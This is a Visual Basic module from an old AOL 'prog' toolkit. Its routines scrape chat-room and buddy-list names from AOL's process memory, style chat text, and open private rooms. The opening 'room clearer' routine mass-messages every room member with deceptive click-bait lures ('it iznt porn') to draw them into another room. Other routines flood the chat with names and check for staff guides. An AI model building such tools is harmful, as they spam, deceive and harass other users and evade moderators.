'juz make da label wit no caption and diz will do da rezt
If s.caption = "a" Then GoTo byez
If AOL_VerzioN = 2 Then MsgBox "cant uze thiz on ao25", vbCritical, "err0r!": Exit Sub
If FindRoom Then
Call IMsOff
Dim sPrompt As String 'Local variable...
Static iXPos As Integer, iYPos As Integer 'Value maintained between calls...
sPrompt = "enter da pr name to send em to"  'Set the prompt...
SetWinOnTop = SetWindowPos(X, HWND_BROADCAST, 0, 0, 0, 0, FLAGz)
X = sPrompt
sPrompt = X
sName$ = InputBox$(sPrompt, "mazta progg ro0m clearer", "IXI", iXPos, iYPos)
If sName$ = "" Then Exit Sub
On Error Resume Next
Dim AOLProcess As Long
Dim tim
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
aTnt& = aolhandle
f$ = listcount(aTnt&)
timz = "0"
Do:
If s.caption = "a" Then GoTo byez
DoEvents:
f$ = f$ - 1
timz = timz + 4
If s.caption = "a" Then GoTo byez
Loop Until f$ = "0"
If s.caption = "a" Then GoTo byez
p& = timz
ent$ = convertseconds(p&)
If MsgBox("Estimated time left to finish thiz iz " + ent$ + " secondz" + Chr(13) + "Continue....?", vbQuestion + vbYesNo, "Confirm?") = vbYes Then GoTo nt Else Exit Sub
nt:
If s.caption = "a" Then GoTo byez
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If s.caption = "a" Then GoTo byez
If Person$ = getuser Then GoTo na
Call RePlacestRing(Person$, Chr(9), "")
Call RePlacestRing(Person$, Chr(13), "")
Call RePlacestRing(Person$, Chr(10), "")
Call RePlacestRing(Person$, " ", "")
Call RePlacestRing(Person$, "/", "")
Call RePlacestRing(Person$, "\", "")
If s.caption = "a" Then GoTo byez
    Dim phRaZe
    Randomize
    phRaZe = Int(5 * Rnd + 1)
If phRaZe = 1 Then d$ = "hey zup, click < a href=""""aol://2719:2-2-" + sName$ + """"">Here</a> for my pic, it iznt porn -=]"
If phRaZe = 2 Then d$ = "new hot aol chat room, click < a href=""""aol://2719:2-2-" + sName$ + """"">Here</a> to enter it!"
If phRaZe = 3 Then d$ = "wanna check out my new web page? it has alot of downloadz, click < a href=""""aol://2719:2-2-" + sName$ + """"">Here</a>"
If phRaZe = 4 Then d$ = "herez my pic, < a href=""""aol://2719:2-2-" + sName$ + """"">Click Here for iT</a>"
If phRaZe = 5 Then d$ = "IXI chat ro0m < a href=""""aol://2719:2-2-" + sName$ + """"">Here</a>"
If s.caption = "a" Then GoTo byez
Call sendim(Person$, d$)
If s.caption = "a" Then GoTo byez
TimeOut (2)
Call Win_Close(IMFind)
If s.caption = "a" Then GoTo byez
TimeOut (2)
If s.caption = "a" Then GoTo byez
na:
Next Index
byez:
s.caption = ""
Call CloseHandle(AOLProcessThread)
End If
Else
MsgBox "cant find chat ro0m", vbCritical, "err0r!"
End If
End Sub
Function FindChildByClass(Parent, child As String) As Integer
childfocus% = GetWindow(Parent, 5)

While childfocus%
buffer$ = String$(250, 0)
classbuffer% = GetClassName(childfocus%, buffer$, 250)

If InStr(UCase(buffer$), UCase(child)) Then FindChildByClass = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend

End Function
Function Cchat_Ig(wUt As String, UnignorE As Boolean)
'ouwop
'true = ig
'false = un.ig
'ig in IM t0 >;]
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
ListBox.Clear

room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = getuser Then GoTo na
If InStr(LCase(Person$), LCase(wUt$)) Then final$ = Person$: GoTo tru
na:
Next Index
tru:
If UnignorE = True Then Call chatignorebyname(final$, final$) Else Call chatunignorebyname(final$, final$)
If UnignorE = True Then Call sendim("$IM_OFF, " + final$, "MazTa IG") Else Call sendim("$IM_ON, " + final$, "MazTa IG")

Call CloseHandle(AOLProcessThread)
End If

End Function

Function Guide_Check()
'ouwop
'If Guide_Check = 1 then guidez in room
'If Guide_Check = 0 then no guide in ro0m

On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)

If InStr(LCase(Person$), LCase("guide")) Then
Guide_Check = 1
Exit Function
Else
If InStr(LCase(Person$), LCase("host")) Then
Guide_Check = 1
Exit Function
Else
GoTo nee
End If
End If
nee:
Next Index
Call CloseHandle(AOLProcessThread)
End If


End Function
Function Look4WHO(Who As String)
'ouwop
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If InStr(LCase(Person$), LCase(Who$)) Then
Look4WHO = 1
Exit Function
Else
GoTo nee
End If
nee:
Next Index
Call CloseHandle(AOLProcessThread)
End If


End Function


Function Look4guidE()
'ouwop
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear

room = findChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = InStr(LCase$(namez$), LCase$("guide")) Then
Look4guidE = 1
GoTo nerr
Else
Look4guidE = 0
End If
Next Index
nerr:
Call CloseHandle(AOLProcessThread)
End If

End Function





Function Chat_Elite(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If crapp% > 0 Then GoTo dustepp2

If NextChr$ = "A" Then Let NextChr$ = "A"
If NextChr$ = "a" Then Let NextChr$ = "å"
If NextChr$ = "B" Then Let NextChr$ = "ß"
If NextChr$ = "C" Then Let NextChr$ = "Ç"
If NextChr$ = "c" Then Let NextChr$ = "¢"
If NextChr$ = "D" Then Let NextChr$ = "Ð"
If NextChr$ = "d" Then Let NextChr$ = "d"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "è"
If NextChr$ = "f" Then Let NextChr$ = "ƒ"
If NextChr$ = "F" Then Let NextChr$ = "F"
If NextChr$ = "H" Then Let NextChr$ = "H"
If NextChr$ = "h" Then Let NextChr$ = "h"
If NextChr$ = "I" Then Let NextChr$ = "‡"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "J" Then Let NextChr$ = "J"
If NextChr$ = "j" Then Let NextChr$ = "j"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "K" Then Let NextChr$ = "k"
If NextChr$ = "L" Then Let NextChr$ = "£"
If NextChr$ = "l" Then Let NextChr$ = "l"
If NextChr$ = "M" Then Let NextChr$ = "(\/)"
If NextChr$ = "m" Then Let NextChr$ = "m"
If NextChr$ = "N" Then Let NextChr$ = "(\/"
If NextChr$ = "n" Then Let NextChr$ = "ñ"
If NextChr$ = "O" Then Let NextChr$ = "Ø"
If NextChr$ = "o" Then Let NextChr$ = "o"
If NextChr$ = "P" Then Let NextChr$ = "P"
If NextChr$ = "p" Then Let NextChr$ = "Þ"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "Q" Then Let NextChr$ = "q"
If NextChr$ = "r" Then Let NextChr$ = "®"
If NextChr$ = "R" Then Let NextChr$ = "R"
If NextChr$ = "S" Then Let NextChr$ = "§"
If NextChr$ = "s" Then Let NextChr$ = "$"
If NextChr$ = "t" Then Let NextChr$ = "†"
If NextChr$ = "T" Then Let NextChr$ = "T"
If NextChr$ = "U" Then Let NextChr$ = "Ú"
If NextChr$ = "u" Then Let NextChr$ = "u"
If NextChr$ = "V" Then Let NextChr$ = "\/"
If NextChr$ = "v" Then Let NextChr$ = "v"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "X"
If NextChr$ = "x" Then Let NextChr$ = "×"
If NextChr$ = "Y" Then Let NextChr$ = "¥"
If NextChr$ = "y" Then Let NextChr$ = "ý"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "Z" Then Let NextChr$ = "z"
If NextChr$ = "!" Then Let NextChr$ = "¡"
If NextChr$ = "?" Then Let NextChr$ = "?"
If NextChr$ = "." Then Let NextChr$ = "…"
If NextChr$ = "," Then Let NextChr$ = "‚"
If NextChr$ = "1" Then Let NextChr$ = "1"
If NextChr$ = "%" Then Let NextChr$ = "‰"
If NextChr$ = "2" Then Let NextChr$ = "2"
If NextChr$ = "3" Then Let NextChr$ = "3"
If NextChr$ = "_" Then Let NextChr$ = "_"
If NextChr$ = "-" Then Let NextChr$ = "—"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$

dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
Chat_Elite = newsent$

End Function
Function Chat_RCwerDz(strin As String)
'ouwop
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If crapp% > 0 Then GoTo dustepp2
If NextChr$ = " " Then Let NextChr$ = " " & "<Font color=#" + RandomColor + ">"
Let newsent$ = newsent$ + NextChr$
dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
Chat_RCwerDz = newsent$
End Function
Function Chat_RCLeTTerz(strin As String)
'ouwop
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
af$ = "0"
Do While NumSpc% <= lenth%
af$ = af$ + 1
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If crapp% > 0 Then GoTo dustepp2
If af$ = "3" Then Let NextChr$ = NextChr$ & "<Font color=#" + RandomColor + ">": af$ = "0"
Let newsent$ = newsent$ + NextChr$
dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
Chat_RCLeTTerz = newsent$
End Function


Function Chat_DrunK(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While NumSpc% <= lenth%
DoEvents
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let nextchrr$ = Mid$(inptxt$, NumSpc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo dustepp2
If crapp% > 0 Then GoTo dustepp2

If NextChr$ = "A" Then Let NextChr$ = "ey"
If NextChr$ = "a" Then Let NextChr$ = "Aa"
If NextChr$ = "B" Then Let NextChr$ = "Bee"
If NextChr$ = "C" Then Let NextChr$ = "ceE"
If NextChr$ = "c" Then Let NextChr$ = "sea"
If NextChr$ = "D" Then Let NextChr$ = "de"
If NextChr$ = "d" Then Let NextChr$ = "d"
If NextChr$ = "E" Then Let NextChr$ = "Ê"
If NextChr$ = "e" Then Let NextChr$ = "E"
If NextChr$ = "f" Then Let NextChr$ = "eƒ"
If NextChr$ = "F" Then Let NextChr$ = "fF"
If NextChr$ = "H" Then Let NextChr$ = "eighch"
If NextChr$ = "h" Then Let NextChr$ = "h"
If NextChr$ = "I" Then Let NextChr$ = "eye"
If NextChr$ = "i" Then Let NextChr$ = "î"
If NextChr$ = "J" Then Let NextChr$ = "Jay"
If NextChr$ = "j" Then Let NextChr$ = "jJ"
If NextChr$ = "k" Then Let NextChr$ = "|‹"
If NextChr$ = "K" Then Let NextChr$ = "kay"
If NextChr$ = "L" Then Let NextChr$ = "e£"
If NextChr$ = "l" Then Let NextChr$ = "llo"
If NextChr$ = "M" Then Let NextChr$ = "(\/)"
If NextChr$ = "m" Then Let NextChr$ = "mem"
If NextChr$ = "N" Then Let NextChr$ = "(\/"
If NextChr$ = "n" Then Let NextChr$ = "eeñ"
If NextChr$ = "O" Then Let NextChr$ = "Oo0Ø"
If NextChr$ = "o" Then Let NextChr$ = "o"
If NextChr$ = "P" Then Let NextChr$ = "Pee"
If NextChr$ = "p" Then Let NextChr$ = "Þe"
If NextChr$ = "q" Then Let NextChr$ = "qQ"
If NextChr$ = "Q" Then Let NextChr$ = "Qq"
If NextChr$ = "r" Then Let NextChr$ = "®r"
If NextChr$ = "R" Then Let NextChr$ = "R"
If NextChr$ = "S" Then Let NextChr$ = "e§"
If NextChr$ = "s" Then Let NextChr$ = "$z"
If NextChr$ = "t" Then Let NextChr$ = "†ea"
If NextChr$ = "T" Then Let NextChr$ = "Tee"
If NextChr$ = "U" Then Let NextChr$ = "yoÚ"
If NextChr$ = "u" Then Let NextChr$ = "yue"
If NextChr$ = "V" Then Let NextChr$ = "\/ew"
If NextChr$ = "v" Then Let NextChr$ = "vef"
If NextChr$ = "W" Then Let NextChr$ = "VV"
If NextChr$ = "w" Then Let NextChr$ = "vv"
If NextChr$ = "X" Then Let NextChr$ = "xX"
If NextChr$ = "x" Then Let NextChr$ = "e×"
If NextChr$ = "Y" Then Let NextChr$ = "y¥"
If NextChr$ = "y" Then Let NextChr$ = "ýa"
If NextChr$ = "z" Then Let NextChr$ = "Zz"
If NextChr$ = "Z" Then Let NextChr$ = "zW"
If NextChr$ = "!" Then Let NextChr$ = "¡@"
If NextChr$ = "?" Then Let NextChr$ = "?>"
If NextChr$ = "." Then Let NextChr$ = "…,"
If NextChr$ = "," Then Let NextChr$ = "‚."
If NextChr$ = "1" Then Let NextChr$ = "12"
If NextChr$ = "%" Then Let NextChr$ = "$"
If NextChr$ = "2" Then Let NextChr$ = "2wo"
If NextChr$ = "3" Then Let NextChr$ = "3hree"
If NextChr$ = "_" Then Let NextChr$ = "-"
If NextChr$ = "-" Then Let NextChr$ = "_"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$

dustepp2:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop
Chat_DrunK = newsent$

End Function




Sub AddRoomToCombobox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListbox(ListBox)

For q = 0 To ListBox.listcount
    ComboBox.AddItem (ListBox.list(q))
Next q
End Sub
Sub AOL4_AddBuddyListToListBox(lst As ListBox)
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = FindChildByTitle(AolMdi(), "Buddy List Window")
aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
lst.AddItem Person$
Next Index
Call CloseHandle(AOLProcessThread)
End If
End Sub

Sub MSG_whozChatting(place$, crib$)


    Dim Process As Long, ListHoldItem As Long, name As String
    Dim ListHoldName As Long, BytesRead As Long, ListHandle1 As Long
    Dim ProcessThread As Long, SearchIndex As Long, ListHandle2 As Long
    Dim ListHandle3 As Long, SetIndex As Long, WhosChatting As Long
    Dim AolIcon As Long, Current As Long
    If FindAChatWindow& = 0& Then
        Call PopUpIcon(9, "F")
        Do: DoEvents
            ListHandle1& = FindWindowEx(FindAChatWindow&, 0&, "_AOL_Listbox", vbNullString)
            ListHandle2& = FindWindowEx(FindAChatWindow&, ListHandle1&, "_AOL_Listbox", vbNullString)
        Loop Until FindAChatWindow& <> 0& And ListHandle1& <> 0& And ListHandle2& <> 0&
      Call TimeOut(1)
      Call waitforlisttoload(ListHandle1&)
      TimeOut (0.2)
      Call waitforlisttoload(ListHandle2&)
    End If
    ListHandle1& = FindWindowEx(FindAChatWindow&, 0&, "_AOL_Listbox", vbNullString)
    ListHandle2& = FindWindowEx(FindAChatWindow&, ListHandle1&, "_AOL_Listbox", vbNullString)
    AolIcon& = NextOfClassByCount(FindAChatWindow&, "_AOL_Icon", 9)
   

On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = FindChildByTitle(AolMdi(), "Find a Chat")
aolhandle = FindChildByClass(room, "_AOL_Listbox")
aolhandle2 = GetWindow(aolhandle, GW_HWNDNEXT)
aolhandle2 = GetWindow(aolhandle2, GW_HWNDNEXT)

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(33, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call SendMessage(aolhandle, LB_SETCURSEL, Index, 0&)
Person$ = LCase(Person$)
place$ = LCase(place$)
If Person$ = place$ Then Call PostMessage(aolhandle, WM_LBUTTONDBLCLK, 0&, 0&): GoTo a
Next Index
a:
daRoOmz& = aolhandle2
Call waitforlisttoload(daRoOmz&)

Call CloseHandle(AOLProcessThread)
End If
'''
'''
TimeOut (2)
'''
AOLThread = GetWindowThreadProcessId(aolhandle2, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle2, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle2, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(33, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call SendMessage(aolhandle2, LB_SETCURSEL, Index, 0&)

Person$ = LCase(Person$)
crib$ = LCase(crib)

If InStr(Person$, crib$) Then
TimeOut (0.3)
'yeah


         cLickiCoN (AolIcon&)
        Do: DoEvents
            WhosChatting& = FindWindowEx(AolMdi, 0&, "AOL Child", "Who's Chatting")
            ListHandle3& = FindWindowEx(WhosChatting&, 0&, "_AOL_Listbox", vbNullString)
         TimeOut (0.1)
        Loop Until WhosChatting& <> 0& And ListHandle3& <> 0&
            Call AOL4_KillWin(FindAChatWindow&)
            TimeOut (0.3)


Exit Sub
End If

Next Index
Call CloseHandle(AOLProcessThread)
End If


End Sub
Sub AOL4_ScrollBuddLizT()
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
room = FindChildByTitle(AolMdi(), "Øüvvøpz Pëëpz™")

aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
b$ = "[`·¸["
sendchat b$ + Person$ + "</b>"

TimeOut (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If

room = FindChildByTitle(AolMdi(), "Buddy List Window")

aolhandle = FindChildByClass(room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
b$ = "[`·¸["
sendchat b$ + Person$ + "</b>"

TimeOut (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub



Function XAOL4_GetCurrentRoomName()
'ouwop
'aol2-4-5
If AOL_VerzioN = 2 Then
XAOL4_GetCurrentRoomName = AOL25_GetCurrentRoOmName
Else
XAOL4_GetCurrentRoomName = getcaption(findChatRoom)

End If
End Function
Sub XAOL4_Keyword(txt)
txg$ = txt
If AOL_VerzioN = 2 Then Call AOL25_keyword(txg$): Exit Sub
    
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    kwbox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(kwbox%, WM_SETTEXT, 0, txt)
    Call SendMessageByNum(kwbox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(kwbox%, WM_CHAR, VK_RETURN, 0)
End Sub
Sub XAOL4_OpenPR(PRrm As String)
TimeOut (0.1)
If AOL_VerzioN = 4 Then Call XAOL4_Keyword("aol://2719:2-2-" & PRrm)
If AOL_VerzioN = 5 Then Call XAOL4_Keyword("aol://2719:2-2-" & PRrm)
If AOL_VerzioN = 2 Then Call AOL25_keyword("aol://2719:2-2-" & PRrm)
TimeOut (0.2)
End Sub


Sub XAOL4_PRBust(room$)
chat = XAOL4_GetCurrentRoomName
Do
Call XAOL4_OpenPR(room$)
If XAOL4_GetCurrentRoomName = RemoveSpace(LCase(room$)) Then GoTo xero
AOL% = FindWindow("#32770", "America Online")
If AOL% Then
closeaol% = SendMessage(AOL%, WM_CLOSE, 0, 0)
pause 0.1
End If
If XAOL4_GetCurrentRoomName = RemoveSpace(LCase(room$)) Then GoTo xero
pause 0.5
If XAOL4_GetCurrentRoomName = RemoveSpace(LCase(room$)) Then GoTo xero
Loop Until XAOL4_GetCurrentRoomName = RemoveSpace(LCase(room$))
xero:
'SendChat ("•`'´•Ouwopz to0lz Taking over " + XAOL4_GetCurrentRoomName + "•`'´•")



End Sub







Function Chat_Dashed(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
